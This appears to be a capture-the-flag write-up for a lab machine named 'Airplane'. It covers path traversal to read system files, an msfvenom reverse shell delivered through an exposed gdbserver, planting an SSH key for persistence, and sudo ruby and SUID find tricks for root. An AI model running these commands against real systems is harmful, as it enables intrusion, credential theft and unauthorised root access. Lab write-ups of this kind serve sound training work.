# Airplane writeup

---

## NMap scan

```
nmap -sCV -Pn 10.114.188.117
```

```ruby
Nmap scan report for 10.114.188.117
Host is up (0.070s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
|   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
|_  256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)
8000/tcp open  http    Werkzeug httpd 3.0.2 (Python 3.8.10)
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.60 seconds

```

---

## open website 

```
http://airplane.thm:8000/?page=index.html
```

<img width="1918" height="779" alt="image" src="https://github.com/user-attachments/assets/9564e803-a966-4194-8e79-3bf04160d7a1" />

\
## let's try pathtravesal 

```
http://airplane.thm:8000/?page=../../../../../../../../etc/passwd
```

<img width="1919" height="350" alt="image" src="https://github.com/user-attachments/assets/deb5c5c2-321a-4ff0-b21a-1a78919d2bd6" />

<img width="1542" height="611" alt="image" src="https://github.com/user-attachments/assets/9771216d-35e3-471a-95fa-7deee4860999" />

---

## good let's see env 

```
GET /?page=../../../../../../../../proc/self/environ
```

<img width="1595" height="522" alt="image" src="https://github.com/user-attachments/assets/c64095f0-9e7c-41be-986e-9c780198fb77" />

```
?page=./../../../../home/hudson/app/app.py
```

<img width="1765" height="635" alt="image" src="https://github.com/user-attachments/assets/16186f04-8191-4a4f-b3b1-ad6e910b8ceb" />

```
GET /?page=../../../../../../../../proc/self/cmdline HTTP/1.1
```

<img width="1372" height="332" alt="image" src="https://github.com/user-attachments/assets/368e650e-51d5-4140-88ea-9aaf66e4696a" />

```python
import requests

for i in range(1, 1001):
    print(f"\r{i}", end="", flush=True)
    url = f"http://airplane.thm:8000/?page=../../../../../proc/{i}/cmdline"
    response = requests.get(url)

    if response.status_code == 200:
        content = response.text
        if 'Page not found' not in content and content.strip():
            print(f"\r/proc/{i}/cmdline: {content}")

```

```
/proc/525/cmdline: /usr/bin/gdbserver0.0.0.0:6048airplane
/proc/563/cmdline: /opt/airplane
```

<img width="1073" height="366" alt="image" src="https://github.com/user-attachments/assets/c7964975-b4c6-43f7-ab55-3c80b3c309b3" />

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.134.38 LPORT=4444 PrependFork=true -f elf -o binary.elf
chmod +x binary.elf

```

<img width="1325" height="237" alt="image" src="https://github.com/user-attachments/assets/bc23d28b-02b0-45a7-bd87-905181b4bb7f" />

```
gdb binary.elf
```

```
target extended-remote 10.114.188.117:6048
remote put binary.elf /home/hudson/binary.elf
set remote exec-file /home/hudson/binary.elf
run
```

```
nc -lnvpn 4444
```

<img width="791" height="132" alt="image" src="https://github.com/user-attachments/assets/b78272b1-6882-46bd-bf83-8715e1ccf653" />

## privesc

> ### After running LinPEAS we find the SUID binary find, owned by carlos.

## [gtfobins](https://gtfobins.org/gtfobins/find/#suid)

<img width="1058" height="221" alt="image" src="https://github.com/user-attachments/assets/0d2ac6e9-15e5-4a03-8e30-258640b549b3" />

## as we can write now in **`carlos`** directory  let's add ssh key

```
ssh-keygen -t rsa -b 4096 -f ~/.ssh/carlos_key -N ""
cat ~/.ssh/carlos_key.pub
```

```
mkdir -p /home/carlos/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ..." > /home/carlos/.ssh/authorized_keys
chmod 700 /home/carlos/.ssh
chmod 600 /home/carlos/.ssh/authorized_keys
```

<img width="1076" height="552" alt="image" src="https://github.com/user-attachments/assets/e740723b-08bf-41ab-a927-420cefd6b585" />

---

```
sudo -l
```

<img width="1135" height="160" alt="image" src="https://github.com/user-attachments/assets/3905dc1a-768f-4e24-b90b-c6ae623b830d" />

```
echo 'system("/bin/bash")' > evil.rb
sudo /usr/bin/ruby /root/../home/carlos/evil.rb
```

<img width="845" height="191" alt="image" src="https://github.com/user-attachments/assets/2bdc7d88-f9cf-4068-bfc2-d8fdbe2c51b6" />

